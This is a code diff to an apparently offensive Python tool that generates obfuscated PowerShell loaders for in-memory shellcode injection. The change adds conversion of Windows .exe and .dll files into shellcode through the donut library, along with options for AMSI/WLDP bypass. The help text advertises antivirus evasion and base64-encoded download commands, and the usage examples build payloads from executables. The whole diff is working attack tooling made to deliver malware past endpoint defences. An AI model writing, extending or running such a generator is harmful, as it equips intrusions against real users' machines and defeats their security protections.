@@ -7,6 +7,13 @@ import socket
 import base64
 import re
 
+# Try to import donut for .exe to shellcode conversion
+try:
+    import donut
+    DONUT_AVAILABLE = True
+except ImportError:
+    DONUT_AVAILABLE = False
+
 # ------------------------------------------------------------------
 # CONFIGURATION
 # ------------------------------------------------------------------
@@ -25,6 +32,62 @@ def get_local_ip():
     finally:
         s.close()
     return IP
+
+def is_exe_file(filepath):
+    """Checks if a file is a Windows executable (.exe or .dll)."""
+    if not os.path.exists(filepath):
+        return False
+    
+    # Check file extension
+    ext = os.path.splitext(filepath)[1].lower()
+    if ext in ['.exe', '.dll']:
+        return True
+    
+    # Check PE header (MZ signature)
+    try:
+        with open(filepath, 'rb') as f:
+            header = f.read(2)
+            return header == b'MZ'
+    except:
+        return False
+
+def convert_exe_to_shellcode(exe_path, arch=3, bypass=3, params=''):
+    """
+    Converts a .exe file to raw shellcode using donut.
+    
+    Args:
+        exe_path: Path to the .exe/.dll file
+        arch: Target architecture (1=x86, 2=amd64, 3=x86+amd64)
+        bypass: AMSI/WLDP bypass (1=none, 2=abort on fail, 3=continue on fail)
+        params: Optional command line parameters
+    
+    Returns:
+        bytes: Raw shellcode
+    """
+    if not DONUT_AVAILABLE:
+        print("[!] Error: donut module not installed.")
+        print("[!] Install it with: pip3 install donut-shellcode")
+        sys.exit(1)
+    
+    print(f"[*] Converting {exe_path} to shellcode using donut...")
+    print(f"    Architecture: {['', 'x86', 'amd64', 'x86+amd64'][arch]}")
+    print(f"    AMSI/WLDP Bypass: {['', 'none', 'abort on fail', 'continue on fail'][bypass]}")
+    
+    try:
+        # Create donut shellcode
+        shellcode = donut.create(
+            file=exe_path,
+            arch=arch,
+            bypass=bypass,
+            params=params
+        )
+        
+        print(f"[+] Successfully converted to shellcode ({len(shellcode)} bytes)")
+        return shellcode
+        
+    except Exception as e:
+        print(f"[!] Error converting .exe to shellcode: {e}")
+        sys.exit(1)
 
 def random_string(length=6):
     """Generates a random filename to avoid patterns."""
@@ -701,13 +764,14 @@ DESCRIPTION:
     - In-memory shellcode injection using GetDelegateForFunctionPointer
     - Advanced obfuscation (inspired by Chimera) to bypass AV detection
     - Base64-encoded download commands for obfuscation
+    - NEW: Direct .exe/.dll to shellcode conversion using donut
 
 USAGE:
-    python3 {1} <path_to_shellcode.bin> [options]
+    python3 {1} <path_to_file> [options]
     python3 {1} -h, --help
 
 ARGUMENTS:
-    <path_to_shellcode.bin>    Path to the binary shellcode file to embed
+    <path_to_file>              Path to shellcode file (.bin) or executable (.exe/.dll)
 
 OPTIONS:
     -h, --help                  Show this help message and exit
@@ -716,13 +780,24 @@ OPTIONS:
     -o, --obfuscate             Enable obfuscation (default: enabled)
     --no-obfuscate              Disable obfuscation
     -d, --debug                 Enable debug output in PowerShell (shows decryption info)
+    
+    DONUT OPTIONS (for .exe/.dll files):
+    -a, --arch ARCH             Target architecture: 1=x86, 2=amd64, 3=x86+amd64 (default: 3)
+    -b, --bypass BYPASS         AMSI/WLDP bypass: 1=none, 2=abort, 3=continue (default: 3)
+    -p, --params PARAMS         Command line parameters to pass to the executable
 
 EXAMPLES:
-    # Generate payload with default obfuscation (level 3)
+    # Generate payload from raw shellcode with default obfuscation (level 3)
     python3 {1} shellcode.bin
 
-    # Generate payload with high obfuscation
-    python3 {1} shellcode.bin -l 4
+    # Generate payload from .exe file (auto-converts to shellcode)
+    python3 {1} payload.exe -l 4
+
+    # Generate payload from .exe with command line parameters
+    python3 {1} payload.exe -p "arg1 arg2" -l 5
+
+    # Generate payload from .exe targeting x64 only
+    python3 {1} payload.exe --arch 2 -l 4
 
     # Generate payload without obfuscation
     python3 {1} shellcode.bin --no-obfuscate
@@ -856,6 +931,11 @@ def main():
     enable_debug = False
     input_file = None
     
+    # Donut options
+    donut_arch = 3          # 1=x86, 2=amd64, 3=x86+amd64
+    donut_bypass = 3        # 1=none, 2=abort, 3=continue
+    donut_params = ''       # Command line parameters
+    
     i = 1
     while i < len(sys.argv):
         arg = sys.argv[i]
@@ -876,6 +956,44 @@ def main():
                     return
             else:
                 print("[!] Error: -l/--level requires a value")
+                return
+        elif arg in ['-a', '--arch']:
+            if i + 1 < len(sys.argv):
+                try:
+                    donut_arch = int(sys.argv[i + 1])
+                    if donut_arch < 1 or donut_arch > 3:
+                        print("[!] Error: Architecture must be 1 (x86), 2 (amd64), or 3 (x86+amd64)")
+                        return
+                    i += 2
+                    continue
+                except ValueError:
+                    print("[!] Error: Invalid architecture value")
+                    return
+            else:
+                print("[!] Error: -a/--arch requires a value")
+                return
+        elif arg in ['-b', '--bypass']:
+            if i + 1 < len(sys.argv):
+                try:
+                    donut_bypass = int(sys.argv[i + 1])
+                    if donut_bypass < 1 or donut_bypass > 3:
+                        print("[!] Error: Bypass must be 1 (none), 2 (abort), or 3 (continue)")
+                        return
+                    i += 2
+                    continue
+                except ValueError:
+                    print("[!] Error: Invalid bypass value")
+                    return
+            else:
+                print("[!] Error: -b/--bypass requires a value")
+                return
+        elif arg in ['-p', '--params']:
+            if i + 1 < len(sys.argv):
+                donut_params = sys.argv[i + 1]
+                i += 2
+                continue
+            else:
+                print("[!] Error: -p/--params requires a value")
                 return
         elif arg in ['-o', '--obfuscate']:
             enable_obfuscation = True
@@ -911,14 +1029,23 @@ def main():
         print(f"[!] Error: File '{input_file}' not found.")
         return
 
-    print(f"[*] Reading shellcode from: {input_file}")
-    
-    try:
-        with open(input_file, "rb") as f:
-            raw_bytes = f.read()
-    except Exception as e:
-        print(f"[!] Error reading file: {e}")
-        return
+    # Check if input is an .exe/.dll file and convert to shellcode using donut
+    if is_exe_file(input_file):
+        print(f"[*] Detected executable file: {input_file}")
+        raw_bytes = convert_exe_to_shellcode(
+            input_file, 
+            arch=donut_arch, 
+            bypass=donut_bypass, 
+            params=donut_params
+        )
+    else:
+        print(f"[*] Reading raw shellcode from: {input_file}")
+        try:
+            with open(input_file, "rb") as f:
+                raw_bytes = f.read()
+        except Exception as e:
+            print(f"[!] Error reading file: {e}")
+            return
 
     # Encrypt the shellcode
     print("[*] Encrypting shellcode payload...")
